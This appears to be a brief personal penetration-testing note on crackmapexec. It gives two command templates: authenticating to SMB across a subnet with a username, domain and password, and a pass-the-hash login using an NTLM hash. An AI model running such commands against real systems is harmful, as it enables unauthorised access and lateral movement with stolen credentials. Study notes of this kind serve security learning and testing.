**crackmapexec**

syntax:
```
crackmapexec smb <target.subnet/24> -u <username> -d <domain.com> -p <password>
```
![[Pasted image 20250402225610.png]]


**pass the hash using NTLM hash**
```
crackmapexec smb <target ip/subnet> -u <username> -H <hash> --local-auth
```
![[Pasted image 20250402225443.png]]